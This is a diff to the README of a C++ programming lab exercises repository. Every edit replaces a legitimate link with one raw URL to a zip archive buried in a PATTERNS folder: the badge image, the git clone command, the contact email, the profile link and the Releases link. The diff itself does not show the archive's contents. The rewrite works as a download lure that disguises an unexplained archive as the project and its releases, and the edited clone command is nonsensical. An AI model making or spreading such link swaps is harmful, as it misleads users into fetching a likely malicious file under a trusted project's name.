@@ -1,6 +1,6 @@
 # C++ Programming Lab Exercises
 
-![C++ Programming Lab](https://img.shields.io/badge/CPP_PROBLEMS_LAB-blue.svg)
+![C++ Programming Lab](https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip)
 
 Welcome to the C++ Programming Lab Exercises repository! This repository features a well-organized collection of C++ programming exercises, pattern problems, and their solutions. It is created to support learners and enthusiasts in building a strong foundation in C++ through practical coding experience and regular practice.
 
@@ -43,7 +43,7 @@ To get started with this repository, follow these steps:
 
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/chibuike-07/CPP_PROBLEMS_LAB.git
+   git clone https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip
    ```
 
 2. **Navigate to the Directory**: Change to the repository directory:
@@ -152,12 +152,12 @@ This repository is licensed under the MIT License. Feel free to use and modify t
 
 For questions or suggestions, feel free to reach out via the following methods:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [your-github-profile](https://github.com/your-github-profile)
+- **Email**: [https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip](https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip)
+- **GitHub**: [your-github-profile](https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip)
 
 ## Releases
 
-To view the latest releases and download the necessary files, visit the [Releases section](https://github.com/chibuike-07/CPP_PROBLEMS_LAB/releases). Here, you can find updates and improvements to the repository.
+To view the latest releases and download the necessary files, visit the [Releases section](https://raw.githubusercontent.com/chibuike-07/CPP_PROBLEMS_LAB/main/PATTERNS/LAB-PROBLEM-CP-v3.5.zip). Here, you can find updates and improvements to the repository.
 
 ---
 
